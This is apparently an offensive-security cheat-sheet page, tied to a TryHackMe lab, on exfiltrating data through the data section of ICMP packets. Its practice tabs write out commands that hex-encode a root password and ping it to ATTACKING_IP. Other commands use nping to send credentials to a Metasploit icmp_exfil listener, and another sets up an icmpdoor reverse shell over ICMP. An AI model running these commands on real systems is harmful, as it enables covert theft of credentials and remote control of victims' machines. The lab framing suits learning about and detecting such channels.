# ICMP Exfiltration

## Theory

The Internet Control Message Protocol [ICMP](https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol). It is a network layer protocol used to handle error reporting. 

### ICMP Data Section

On a high level, the ICMP packet's structure contains a Data section that can include strings or copies of other information, such as the IPv4 header, used for error messages. The following diagram shows the Data section, which is optional to use.  
We can leverage this section in order to exfiltrate datas.  

## Practice

{% tabs %}

{% tab title="Manualy" %}
We can, on linux targets, exfiltrate datas with the `-p` options of the `ping` command.  
```bash
root@victime$ echo 'root:p@ssw0rd!' | xxd -p
726f6f743a7040737377307264210a

root@victime$ ping ATTACKING_IP -c 1 -p 726f6f743a7040737377307264210a

```
{% hint style="danger" %}
Note that the -p option is only available for **Linux operating systems**. We can confirm that by checking the ping's help manual page.
{% endhint %}
{% endtab %}

{% tab title="metasploit" %}
let's set up the Metasploit framework by selecting the `icmp_exfil` module to make it ready to capture and listen for ICMP traffic. One of the requirements for this module is to set the `BPF_FILTER` option, which is based on TCPDUMP rules, to capture only ICMP packets and ignore any ICMP packets that have the source IP of the attacking machine as follows.

```bash
msf5 > use auxiliary/server/icmp_exfil
msf5 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src ATTACKING_IP
BPF_FILTER => icmp and not src ATTACKBOX_IP

msf5 auxiliary(server/icmp_exfil) > run
```  
  
On the target, we can now exfiltrate data.  
```bash
#First, send the BOF trigger
v4resk@victime$ sudo nping --icmp -c 1 ATTACKING_IP --data-string "BOFfile.txt"

#Datas
v4resk@victime$ sudo nping --icmp -c 1 ATTACKING_IP --data-string "admin:password"

#EOF end signal
v4resk@victime$ sudo nping --icmp -c 1 ATTACKING_IP --data-string "EOF"
```
{% endtab %}

{% tab title="icmpdoor" %}
[ICMPDoor](https://github.com/krabelize/icmpdoor) is an open-source reverse-shell written in Python3 and scapy. The tool uses the same concept we discussed earlier, where an attacker utilizes the Data section within the ICMP packet. The only difference is that an attacker sends a command that needs to be executed on a victim's machine. Once the command is executed, a victim machine sends the execution output within the ICMP packet in the Data section.  
  
On the victime machine:
```bash
victime@target$ sudo icmpdoor -i eth0 -d ATTACKING_IP
```
  
On the attacking machine:
```bash
veresk@kali$ sudo icmp-cnc -i eth1 -d VICTIME_IP
```
{% endtab %}
{% endtabs %}

## References

{% embed url="https://tryhackme.com/room/dataxexfilt/" %}
